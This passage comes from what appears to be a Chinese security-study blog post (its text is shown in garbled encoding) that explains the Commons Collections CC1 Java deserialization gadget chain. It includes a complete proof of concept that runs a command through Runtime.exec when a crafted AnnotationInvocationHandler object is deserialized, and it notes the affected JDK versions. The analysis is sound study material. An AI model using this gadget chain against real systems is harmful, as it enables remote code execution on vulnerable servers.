class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br><span class="hljs-comment">//ÁÑ∂ÂêéÂà©Áî®TransformÊï∞ÁªÑ+ChainedTransformerÊù•ÊääËøô‰∫õ‰∏≤Ëµ∑Êù•ÔºåÊ≥®ÊÑèÂà∞Êàë‰ª¨ÊòØ‰ªéÂèçÂ∞ÑÁöÑÁöÑgetMethodÂºÄÂßãÂÜôÁöÑÔºå‰∏≤Ëµ∑Êù•ÁöÑÈìæÂ¶Ç‰ΩïË∞ÉÁî®Âë¢ÔºåChainedTransformer.transformÊñπÊ≥ïÊòØÂæ™ÁéØË∞ÉÁî®TransformerÊï∞ÁªÑÁöÑÔºåÂõ†Ê≠§‰º†ÁªôÊï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÄºÂç≥ÂèØ</span><br><br><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br><span class="hljs-comment">//        Method getRuntimeMeth = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMeth);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br><span class="hljs-comment">//        Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">//        Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">//        Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">//        Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        execMeth.invoke(runtime, &quot;calc&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÁÑ∂ÂêéÈÖçÂêàÂ§çÂÜôÁÇπÔºåÊää<code>chainedTransformer.transform(Runtime.class);</code>ÈÄöËøá<code>ConstantTransformer</code>ÊääÂÄºÂõ∫ÂåñÂú®Êï∞ÁªÑÁ¨¨‰∏Ä‰ΩçÔºåËß¶Âèë‰∫ÜÂèçÂ∫èÂàóÂåñÂ∞±ËÉΩÁõ¥Êé•Âæ™ÁéØÊï∞ÁªÑ RCE ‰∫Ü</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>         Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Math.class);<br>         declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>         declaredConstructor.newInstance(Target.class,transformers);<br></code></pre></td></tr></table></figure>

<p>Áî±‰∫éÂêéÁª≠Ê∂âÂèäÂà∞<code>hm.put()</code>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂøÖÈ°ª‰∏∫<code>value</code>ÊâçËÉΩËß¶ÂèëÁöÑÈóÆÈ¢ò</p>
<p>ËøôÈáåÁõ¥Êé•ÁªôÂá∫ÂÆåÊï¥ÂèØÊâßË°åÁöÑ poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âú®‰∏äËæπ‰ΩøÁî®<code>TransformedMap.decorate.put</code>Ê≤°Êúâ‰ΩøÁî®<code>AnnotationInvocationHandler</code>‰Ωú‰∏∫Â∫èÂàóÂåñËß¶ÂèëÁÇπÊó∂ÔºåÂú®<code>TransformedMap.decorate</code>‰øÆÈ•∞ËøáÁöÑ<code>HashMap</code>ÂæóÂà∞ÁöÑ<code>outerMap(ËΩ¨ÂåñMap)</code>‰∏≠‰º†ÂÖ•<code>put</code>ÂèÇÊï∞ÂÖ∂ÂÆû‰ªªÊÑèÁöÜÂèØÔºåÊ≠§Â§ÑÂ¶ÇÊûú‰øÆÊîπ<code>hm.put(&quot;value&quot;,&quot;value&quot;);</code>Á¨¨‰∏Ä‰∏™ÂèÇÊï∞<code>&quot;value&quot;</code>‰∏∫ÂÖ∂‰ªñÂÄºÂàô‰∏çËÉΩÊâßË°åÔºöÊ≤°ÊúâÊä•ÈîôÔºå‰πüÁîüÊàê‰∫ÜÂ∫èÂàóÂåñÊµÅ(ËÉΩËæìÂá∫Â∫èÂàóÂåñÂØπË±°)ÔºåÈÇ£ÈóÆÈ¢òÂá∫Âú®Âì™Ôºü</p>
<p>p ÁâõÁõ¥Êé•ÁªôÂá∫‰∫ÜÊù°‰ª∂Ôºö</p>
<p><strong>HashMap.put() Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂøÖÈ°ª‰∏∫ value</strong></p>
<p>Âú®ÂèçÂ∫èÂàóÂåñÁöÑ<code>AnnotationInvocationHandler.readObject</code>‰∏≠ÔºåÊ†πÊçÆÊù°‰ª∂ÔºåÂä®ÊÄÅË∞ÉËØïÂèØÁü•ÔºåÂΩìÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫<code>value</code>Êó∂Ôºå<code>var7!=null</code>ËøõÂÖ•ÂêéÁª≠ÁöÑ<code>var5.setValue</code></p>
<p>Âà∞ËøôÈáåËøòÊòØ‰∏çÊ∏ÖÊ•öÔºö</p>
<ol>
<li>‰∏∫‰ªÄ‰πàËøôÈáåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ<code>value</code>Êó∂<code>var7</code>‰∏ç‰∏∫Á©∫Ôºü</li>
<li>ÂèçÂ∞ÑË∞ÉÁî®<code>AnnotationInvocationHandler</code>ÊûÑÈÄ†ÊñπÊ≥ïÊó∂Ôºå‰º†ÂÖ•‰∫Ü<code>Over.class</code>ÔºåËøô‰∏™Â¶Ç‰ΩïÂæóÊù•ÁöÑ</li>
<li>ËøôÈáåÁöÑ<code>setValue</code>ÊòØÂ¶Ç‰ΩïËß¶ÂèëÁöÑÔºüÔºàÂΩìÁÑ∂Âú® class ÂèçÁºñËØëÁöÑÈõèÂΩ¢Êù•ÁúãÔºå‰∏äËæπ poc ‰øÆÊîπ value Âç≥<code>setValue</code>ÁöÑËß¶ÂèëÊñπÂºèÂ∫îËØ•Êù•Ê∫ê‰∫éËøôÈáåÔºâ</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//ÂøÖÈ°ªË¶ÅÂÖàÂ≠òÂÖ•ÈöèÊÑèÁöÑÈîÆÂÄºÂØπÔºå‰∏ãÈù¢‰∏§Ë°å‰ª£Á†Å‰øÆÊîπËøô‰∏™ÈîÆÂÄºÂØπÁöÑÂÄºËß¶Âèë</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>Ê∑±ÂÖ•Â≠¶‰π†‰∏Ä‰∏ãÔºö</p>
<blockquote>
<p>sun ÂåÖÁöÑ‰ª£Á†ÅÊòØÂèçÁºñËØëÂêéÁöÑÔºåÂèØËØªÊÄßËæÉÂ∑ÆÔºåÂú® openjdk ÂØºÂÖ•Áõ∏ÂØπÂ∫îÁâàÊú¨ÁöÑÊ∫êÁ†ÅËøõË°åÈòÖËØª</p>
<p>Ê†πÊçÆ b Á´ôÂ∏àÂÇÖ‚ÄîÁôΩÊó•Ê¢¶ÁªÑÈïø Âú® b Á´ôÁöÑËÆ≤Ëß£Ôºå‰∏ãËΩΩ 8u_65 ‰ª•Âèä<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%9C%A8idea%E9%87%8C%EF%BC%8C%E8%AF%A6%E8%A7%81https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4ÔºåÈÖçÁΩÆÂú®ideaÈáåÔºåËØ¶ËßÅhttps://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5</a> Á©∫ÈôçÔºö8:23</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220824224527904.png" srcset="/img/loading.gif" lazyload></p>
<p><code>AnnotationType</code>ÊòØ‰ªÄ‰πàÊù•ÁöÑÔºü</p>
<p>ËøôÂ∞±Ë¶ÅÂºïÂá∫ java Êñ∞ÁöÑÁü•ËØÜÁÇπ</p>
<p><strong>AnnotationType</strong></p>
<p>Ê≥®Ëß£„ÄÅÊ†áÈáäÔºåËøôÊòØÂÖ∑ÊúâÂíåÊé•Âè£„ÄÅÁ±ª‰∏ÄÊ†∑ÁöÑÂú∞‰Ωç‰∏ÄÁßçÁ±ªÂûãÔºåÂú® Java SE 5.0 ÂºïÂÖ•ÁöÑÊ¶ÇÂøµ</p>
<ul>
<li>Ê≥®Ëß£ÁöÑÂÆö‰πâ</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> A&#123;&#125;<br></code></pre></td></tr></table></figure>

<p>ÈÄöËøá interface ÂÆö‰πâÔºåÂ¶ÇÊ≠§Â∞±ÂàõÂª∫‰∫Ü‰∏Ä‰∏™ A ÁöÑÊ≥®Ëß£</p>
<ul>
<li>Ê≥®Ëß£ÁöÑ‰ΩøÁî®</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@A</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure>

<p>Âú®Á±ª A ÁöÑÂÆö‰πâÂïÜÊ≥ïÂä†‰∏ä <code>@A</code> Â∞±ÂèØ‰ª•Áî®<code>A</code>Ê≥®Ëß£Ëøô‰∏™Á±ª</p>
<p>ÂèØ‰ª•ÁêÜËß£‰∏∫ A Ëøô‰∏™Á±ªÂÉè‰∏™Ê†áÁ≠æ‰∏ÄÊ†∑Ë¥¥Âú® Demo Ëøô‰∏™Á±ª‰∏äÈù¢</p>
<ul>
<li>ÂÖÉÊ≥®Ëß£</li>
</ul>
<p>ËøòË¶Å‰ΩøÂÖ∂Ê≠£Â∏∏‰ΩøÁî®ÁöÑËØùÔºåËøòÈúÄË¶ÅÂÖÉÊ≥®Ëß£ÔºöÂÖÉÊ≥®Ëß£ÊòØÂèØ‰ª•Ê≥®Ëß£(V.)Âà∞Ê≥®Ëß£(n.)‰∏äÁöÑÊ≥®Ëß£(n.)ÔºåÂç≥ÊòØ‰∏ÄÁßçÂü∫Êú¨Ê≥®Ëß£ÔºåÂè™Êúâ‰∫î‰∏™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention</span>  <span class="hljs-comment">//Á∫¶ÊùüÊ≥®Ëß£ÁöÑÁîüÂëΩÂë®ÊúüÔºåÊúâ‰∏â‰∏™ÂÄºÔºöÊ∫êÁ†ÅÁ∫ßÂà´(source)„ÄÅÁ±ªÊñá‰ª∂Á∫ßÂà´(class)„ÄÅËøêË°åÊó∂Á∫ßÂà´(runtime)</span><br><span class="hljs-meta">@Documented</span> <span class="hljs-comment">//Ë¢´‰øÆÈ•∞ÁöÑÊ≥®Ëß£‰ºöÁîüÊàêÂà∞javadoc‰∏≠</span><br><span class="hljs-meta">@Target</span>     <span class="hljs-comment">//Á∫¶ÊùüÊ≥®Ëß£ÂèØ‰ª•Â∫îÁî®ÁöÑÂú∞Êñπ(Â¶ÇÊñπÊ≥ï„ÄÅÁ±ªÊàñÂ≠óÊÆµ)</span><br><span class="hljs-meta">@Inherited</span>  <span class="hljs-comment">//ËÆ©Ê≥®Ëß£Ë¢´&quot;ÁªßÊâø&quot;ÔºöÂ≠êÁ±ªClassÂØπË±°ÂèØ‰ΩøÁî®getAnnotations()Ëé∑ÂèñÁà∂Á±ªË¢´@Inherited‰øÆÈ•∞ÁöÑÊ≥®Ëß£</span><br><span class="hljs-meta">@Repeatable</span> <span class="hljs-comment">//Ê≥®Ëß£Â§öÂÄº</span><br><br><span class="hljs-comment">//https://www.cnblogs.com/-zhong/p/14961183.html</span><br></code></pre></td></tr></table></figure>

<p>ÊúÄÊó©Êé•Ëß¶ÁöÑÊ≥®Ëß£Â∫îËØ•ÊòØÁªßÊâøÁà∂Á±ªÈáçÂÜô‰∫ÜÊñπÊ≥ïÊó∂ idea Ëá™Âä®ÁîüÊàêÁöÑ<code>@Override</code></p>
<p>ÊØîÂ¶ÇËøô‰∏™‰æãÂ≠ê‰∏≠ÈáçÂÜô‰∫Ü<code>Object.equals</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Object</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p1 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        Person p2 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        String a = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        String b = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        System.out.println(a == b);<br>        System.out.println(a.equals(b));<br>        System.out.println(p1.equals(p2));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Person p = (Person) obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age == p.age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞<code>@Override</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-meta">@Target(ElementType.METHOD)</span>  <span class="hljs-comment">//Ê≥®Ëß£Âà∞ÊñπÊ≥ï</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span>  <span class="hljs-comment">//ÁîüÂëΩÂë®Êúü‰∏∫Ê∫êÁ†ÅÁ∫ß</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override &#123;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÂõûÂà∞Ëøô‰∏™Èìæ‰∏ä</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220825002800801.png" srcset="/img/loading.gif" lazyload></p>
<p>Ë¶ÅËß¶Âèë<code>setValue</code>Â∞±Ë¶Å<code>memberType != null</code>ÔºåÂ∞±Ë¶Å‰ªé<code>xxx.class</code>ÊâæÂà∞ÂÖ∂ÊàêÂëòÊñπÊ≥ïÔºåËÄå‰º†ÂÖ•ÁöÑ class Ë¶ÅÊòØ<code>AnnotationType</code>Á±ªÂûãÁöÑÔºåËØ¥ÁôΩ‰∫ÜÁé∞Âú®Â∞±ÊòØÂ°´ÂÖ•‰∏Ä‰∏™ÂÖÉÊ≥®Ëß£Ôºå‰ª•ÂèäÂú® Map ‰º†ÂÖ•‰∏Ä‰∏™ÈîÆ‰∏∫ËØ•ÂÖÉÊ≥®Ëß£ÁöÑÊàêÂëòÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Retention &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the retention policy.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the retention policy</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">RetentionPolicy <span class="hljs-title">value</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Target &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to</span><br><span class="hljs-comment">     */</span><br>    ElementType[] value();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âõ†Ê≠§Â°´ÂÖ•<code>Target.class Retention.class</code>ÂùáÂèØÔºå‰ª•ÂèäÊúâ‰∏î‰ªÖÊúâÁöÑËøô‰∏™<code>value</code>ÊñπÊ≥ï</p>
<p>ÁÑ∂ÂêéË∑üËøõÂèëÁé∞<code>setValue</code>Ë∞ÉÁî®<code>AbstractInputCheckedMapDecorator.SetValue</code>ÁªßÁª≠Ë∞ÉÁî®<code>checkSetValue</code>ÊñπÊ≥ïÔºåÁÑ∂ÂêéÂ∞±ÊòØ‰æùÊ¨°Ë∞ÉÁî®‰∫Ü<code>chainedTransformer</code>ÁöÑ<code>transform</code>ÊñπÊ≥ïÔºåRCE</p>
<blockquote>
<p>8u_71 ‰øÆÊîπ‰∫Ü sun.reflect.annotation.AnnotationInvocationHandler.readObject Â§çÂÜôÁÇπÔºåÂõ†Ê≠§ cc1 Âè™ÈÄÇÂêàÂú® 8u71 ‰πãÂâçÂà©Áî®</p>
</blockquote>
<h4 id="‚ë°LazyMap-Proxy"><a href="#‚ë°LazyMap-Proxy" class="headerlink" title="‚ë°LazyMap+Proxy"></a>‚ë°LazyMap+Proxy</h4><p>Âú®<code>ysoserial</code>‰∏≠ÔºåÂÖ∂ÂÆûÂπ∂Ê≤°ÊúâÁî®Âà∞<code>TransformeredMap</code>ÔºåËÄåÊòØ‰ΩøÁî®ÁöÑ<code>LazyMap</code></p>
<p>Âå∫Âà´Âú®‰∫éÔºö<code>TransformeredMap</code>Âú®ÂÜôÂÖ•ÂÖÉÁ¥†Êó∂Ë∞ÉÁî®‰∫Ü<code>transform</code>ÔºåËÄå<code>LazyMap</code>ÊòØÂú®<code>get</code>Êó∂Êâæ‰∏çÂà∞ÂÄºÂ∞±Ë∞ÉÁî®‰∫Ü<code>transform</code>ÊñπÊ≥ï(ÂÆûÁé∞‰∫ÜÊáíÂä†ËΩΩ)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;<br>            Object value = factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>Áõ∏ÊØî‰∫é<code>TransformedMap</code>Ôºå<code>LazyMap+AnnotationInvocationHandler</code>ÁªÑÂêàÂà©Áî®ÊñπÂºèÊõ¥‰∏∫Â§çÊùÇÔºåÂõ†‰∏∫Âà©Áî®<code>AnnotationInvocationHandler</code>ÁöÑÂ§çÂÜôÁÇπ<code>readObject</code>ÊòØÊ≤°ÊúâÁõ¥Êé•Ë∞ÉÁî®<code>Map.get</code></p>
